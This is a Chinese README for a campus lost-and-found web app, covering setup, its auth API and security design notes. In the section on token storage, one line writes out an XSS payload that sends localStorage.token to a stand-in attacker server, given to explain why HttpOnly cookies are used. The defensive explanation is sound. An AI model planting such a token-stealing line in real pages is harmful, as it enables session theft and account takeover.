# 杭电校园失物招领系统

> 2026 年杭电助手技术部招新任务 · 开发赛道

一个服务于杭电校园的失物招领平台。同学可以发布**寻物启事**（我丢东西了），
也可以发布**招领启事**（我捡到东西了），通过搜索和状态标记，让丢失的物品尽快回到主人手里。

## 这个项目解决什么问题

校园里每天都发生这些事：

- 「我的校园卡不知道丢哪了。」—— 但**没有一个统一的地方可以发出去让人看到**
- 「在图书馆捡到一副耳机。」—— **不知道交给谁、发在哪里**
- 「有人捡到了我的东西，但我不知道去哪找。」—— **信息不对称，两边都在干等**

微信群和 QQ 群其实能发，但存在明显问题：

| 群聊的问题 | 本系统怎么解决 |
|---|---|
| 消息被聊天记录刷走，几小时后就没人看见了 | 帖子长期保留，按时间排序，随时可查 |
| 没有分类，找"图书馆丢的校园卡"要靠翻记录 | 支持按**类型 + 关键词 + 地点**搜索 |
| 找到了也不会有后续，别人还在帮忙找 | **状态管理**：寻找中 → 已找到 → 已结束 |
| 只能靠群里认识的人 | 公开查询，所有人都能看到 |

**核心价值一句话：把散落在各个群里的失物信息，汇聚成一个可搜索、有状态、可长期查询的平台。**

## 技术选型

| 层次 | 选型 | 为什么 |
|---|---|---|
| 后端框架 | **FastAPI** | 自动生成交互式接口文档（`/docs`），调接口不用装任何额外工具 |
| 数据库 | **SQLite**（标准库 `sqlite3`） | 零安装，一个文件就是数据库；SQL 语法与 MySQL 基本一致，将来可平滑迁移 |
| 认证 | **JWT**（标准库 `hmac` 手写） | 无状态，服务器不用存 session |
| 密码加密 | **scrypt**（标准库 `hashlib`） | 自带盐值，抗暴力破解 |
| 前端 | 原生 HTML / CSS / JavaScript | 无构建步骤，克隆下来就能跑 |

### 为什么依赖这么少？

整个项目**只依赖 FastAPI 和 Uvicorn 两个包**，其余全部用 Python 标准库实现：

| 常规做法 | 本项目做法 | 原因 |
|---|---|---|
| SQLAlchemy（ORM） | 标准库 `sqlite3` + 手写 SQL | 任务要求学习 `WHERE / LIKE / ORDER BY / LIMIT / OFFSET`，手写 SQL 每一句都看得见 |
| python-jose（JWT 库） | 标准库 `hmac` + `hashlib` 手写 | 能完整讲清 JWT 是怎么签出来、怎么验的 |
| passlib / bcrypt | 标准库 `hashlib.scrypt` | 安全等级相同，且省掉一个编译型依赖 |

**带来的实际好处**：部署时只需 `pip install fastapi uvicorn`，
不会出现"C 编译器缺失导致 bcrypt 装不上"这类经典环境问题。

## 快速开始

### 环境要求

- Python 3.10 或更高版本（开发环境为 3.13）
- 无需安装数据库，无需 Node.js

### 启动步骤

```bash
# 1. 进入项目目录
cd lost-and-found

# 2. 安装依赖（只有两个包）
python -m pip install -r requirements.txt

# 3. 设置密钥（可选，但推荐）
#    Windows PowerShell:
$env:LF_SECRET_KEY = "换成你自己的随机字符串"
#    macOS / Linux:
export LF_SECRET_KEY="换成你自己的随机字符串"

# 4. 启动服务
python -m uvicorn app.main:app --reload --port 8000
```

### 打开浏览器

| 地址 | 作用 |
|---|---|
| http://127.0.0.1:8000/docs | **交互式接口文档**，可以直接点按钮调接口（推荐从这里开始） |
| http://127.0.0.1:8000/redoc | 另一种风格的接口文档 |
| http://127.0.0.1:8000/health | 健康检查 |

数据库会在首次启动时**自动创建**，不需要手动建库建表。

### 跑一遍自动化测试

服务器启动后，另开一个终端：

```bash
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\tests\test_auth_api.ps1
```

会依次验证注册、登录、鉴权、防伪造、退出登录等 20 个用例。

完整的接口文档有两种查看方式：

1. **在线交互式文档**：启动服务后访问 http://127.0.0.1:8000/docs
2. **离线文档**：见 `docs/API.md`（阶段四生成）

### 认证接口一览

| 方法 | 路径 | 需要登录 | 说明 |
|---|---|---|---|
| POST | `/api/auth/register` | 否 | 注册，成功后自动登录 |
| POST | `/api/auth/login` | 否 | 登录，返回 token |
| GET | `/api/auth/me` | 是 | 获取当前登录用户 |
| PATCH | `/api/auth/me` | 是 | 修改昵称 / 联系方式 / 头像 |
| POST | `/api/auth/logout` | 是 | 退出登录（凭证立即失效） |

### 统一错误格式

所有错误响应结构一致，前端只需处理一种情况：

```json
{
  "error": true,
  "code": "invalid_credentials",
  "message": "用户名或密码错误"
}
```

常见错误码：

| 错误码 | HTTP | 含义 |
|---|---|---|
| `validation_error` | 422 | 参数校验失败，附 `problems` 说明哪个字段错了 |
| `not_authenticated` | 401 | 未登录 |
| `invalid_credentials` | 401 | 用户名或密码错误 |
| `invalid_signature` | 401 | token 签名校验失败（被篡改） |
| `token_expired` | 401 | token 已过期 |
| `token_revoked` | 401 | token 已注销（退出登录后复用） |
| `username_taken` | 409 | 用户名已被注册 |

## 设计说明

这一节回答任务里提出的思考题，也是二面时可以展开讲的部分。

### 1. 用户登录之后，系统怎么知道"现在操作的人是谁"？

**答案：JWT。**

传统方案是 Session：服务器内存里存一张"会话编号 → 用户"的对照表。
缺点是服务器必须记住每个用户，多台服务器时还要共享这张表。

本项目用 JWT，它是**无状态**的。一个 token 长这样：

```
eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiIxIiwianRpIjoi...In0 . 签名
└──── 头部 ────┘   └──────── 载荷 ────────┘   └ 签名 ┘
```

- **头部**：说明用什么算法签名
- **载荷**：存用户 id、过期时间、token 编号
- **签名**：用服务器密钥对前两段做 HMAC-SHA256 得到的结果

关键在于：**前两段只是 Base64 编码，任何人都能解开看**，所以绝不能放密码。
它防的不是"被看见"，而是"被篡改"——
攻击者想偷偷把载荷里的用户 id 改成别人的，就必须重新算签名，而没有服务器密钥就算不出来。

本项目还额外做了三件事：

1. **白名单校验算法**，防止经典的 `alg=none` 攻击（攻击者把算法改成 none 并去掉签名）
2. **恒定时间比较**（`hmac.compare_digest`），防止通过测量响应时间逐字符猜出签名
3. **黑名单机制**，让"退出登录"立即生效（见下一条）

### 2. token 存在哪里？为什么不用 localStorage？

本项目把 token 放在 **HttpOnly Cookie** 里，而不是 localStorage。

原因：localStorage 里的内容**任何 JavaScript 都能读到**。
一旦页面存在 XSS 漏洞（比如某处把用户输入直接当 HTML 渲染），
攻击者一句 `fetch('http://坏人的服务器/?t=' + localStorage.token)` 就把登录凭证偷走了。

HttpOnly Cookie 设置了 `httponly=True` 后，**JavaScript 完全读不到**，
而且浏览器会自动在每次请求里带上它，前端代码反而更简单。

同时设置了 `samesite="lax"` 缓解 CSRF 攻击。

> 为了兼顾用 `/docs`、curl 手动调试的场景，接口同时也接受
> `Authorization: Bearer <token>` 请求头，两种方式都支持。

### 3. 退出登录为什么要两张表配合？

这是 JWT 的一个固有限制：**它是无状态的，服务器默认无法让它提前失效。**

如果退出登录只是"清掉浏览器 Cookie"，那个 token 字符串在自然过期前（本项目 7 天）
**依然完全有效**。万一它已经被别人复制走了，退出登录根本拦不住他。

所以本项目额外维护了一张 `user_sessions` 表：

- 登录时签发的每个 token 都带一个唯一编号 `jti`
- 退出登录时，把这个 `jti` 写进 `user_sessions`
- 之后每次鉴权，都先查一下这个 `jti` 在不在黑名单里

这样退出登录就是**真正立刻失效**，而不是"看起来退出了"。

### 4. 为什么失物和招领用同一张表？

两者的字段完全一致（物品名、地点、时间、描述、联系方式），
只有 `type` 一个是 `lost`、一个是 `found`。

合成一张表的好处：

- 查询时加 `WHERE type = 'lost'` 就能分开，成本极低
- **将来做智能匹配时**，要在"失物"和"招领"之间两两比对，
  同一张表里直接自连接（self join）就能算，比跨两张表方便得多

### 5. 时间为什么存 UTC？不会差 8 小时吗？

这是个真实的坑，本项目专门处理了。

SQLite 的 `datetime('now')` 返回的是 **UTC 时间**。
本机实测：北京时间 21:19 时，存进数据库的是 13:19。

如果直接把 `"2026-09-30 13:19:00"` 丢给前端，
浏览器会当成"本地时间"来解析，结果显示成 **8 小时前发布**。

本项目的处理方式（见 `app/database.py` 的 `utc_to_iso()`）：

- **数据库统一存 UTC**，这是通行做法，未来多时区也不会乱
- **接口返回时补上 `Z` 标记**：`"2026-09-30T13:19:00Z"`
- 前端 `new Date("2026-09-30T13:19:00Z")` 会自动按用户本地时区渲染

职责划分清晰：**服务器只负责存和传准确的时间，怎么显示交给前端。**

### 6. 密码为什么要加"盐"？

不能存明文，也不能只做简单哈希。

原因：简单哈希（比如 MD5）可以用**彩虹表**反查——
攻击者预先算好几亿个常见密码的哈希值，拿到数据库一比对就还原出原文了。

加盐就是给每个用户的密码拼上一段**随机字符串**再哈希：
同一个密码在不同账号下算出的结果完全不同，彩虹表直接失效。

本项目用 **scrypt** 算法，它被刻意设计成"又慢又费内存"，
让暴力破解的成本高到不可行。存储格式把参数一起存了进去：

```
scrypt$16384$8$1$<盐>$<哈希>
```

好处是将来想调高安全参数时，旧密码仍能用旧参数验证，不需要强制所有用户改密码。

### 7. 为什么错误提示不区分"用户名不存在"和"密码错误"？

两种情况返回**完全相同**的提示：「用户名或密码错误」。

如果分开提示，攻击者就能用一个脚本批量尝试用户名，
根据返回的是"用户不存在"还是"密码错误"，**枚举出系统里到底有哪些账号**。
这是很常见的信息泄露。

本项目还额外做了一层防护：当用户不存在时，
依然执行一次**同等耗时的假哈希运算**。
否则"用户不存在"会瞬间返回，攻击者靠测量响应时间照样能判断出用户名是否存在。

## 常见问题

### Q: 启动时报 "No module named 'uvicorn'"

依赖没装。执行 `python -m pip install -r requirements.txt`。

### Q: 我想重置数据库（清空所有数据）

```bash
python -m app.database
```

会删除数据库文件并重新建表。

### Q: 每次重启服务，之前的登录状态就失效了

因为没设置 `LF_SECRET_KEY`，程序每次启动都会生成一个**随机的临时密钥**
（这是刻意的安全设计：绝不内置一个公开的默认密钥，否则人人都能伪造 token）。

设置一个固定密钥即可解决：

```powershell
$env:LF_SECRET_KEY = "your-random-secret-here"
```

生成随机密钥：`python -c "import secrets; print(secrets.token_urlsafe(48))"`

### Q: 路径里有中文，创建虚拟环境失败

已知问题：Python 在中文路径下执行 `ensurepip` 可能失败。
本项目**不需要虚拟环境**也能运行，直接 `pip install` 即可。

### Q: 端口 8000 被占用

换一个端口：`python -m uvicorn app.main:app --reload --port 8001`
